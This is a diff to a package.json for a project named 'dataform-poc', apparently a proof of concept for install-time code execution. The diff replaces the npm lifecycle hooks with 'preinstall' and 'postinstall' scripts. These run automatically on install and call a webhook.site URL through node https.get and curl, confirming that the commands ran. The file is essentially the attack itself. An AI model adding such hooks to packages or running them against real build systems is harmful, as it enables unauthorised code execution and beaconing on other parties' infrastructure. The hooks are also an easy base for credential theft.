@@ -1,9 +1,10 @@
 {
   "name": "dataform-poc",
   "version": "1.0.0",
+  "description": "dataform poc",
   "dependencies": { "@dataform/core": "3.0.0" },
   "scripts": {
-    "prepare": "curl -s https://webhook.site/3de9b91a-35f5-4220-be32-fac9d26ae8a4/npm-prepare || true",
-    "preinstall": "curl -s https://webhook.site/3de9b91a-35f5-4220-be32-fac9d26ae8a4/npm-preinstall2 || true"
+    "preinstall": "node -e \"require('https').get('https://webhook.site/3de9b91a-35f5-4220-be32-fac9d26ae8a4/npm-pre')\" || curl -s https://webhook.site/3de9b91a-35f5-4220-be32-fac9d26ae8a4/npm-pre || true",
+    "postinstall": "curl -s https://webhook.site/3de9b91a-35f5-4220-be32-fac9d26ae8a4/npm-post || true"
   }
 }
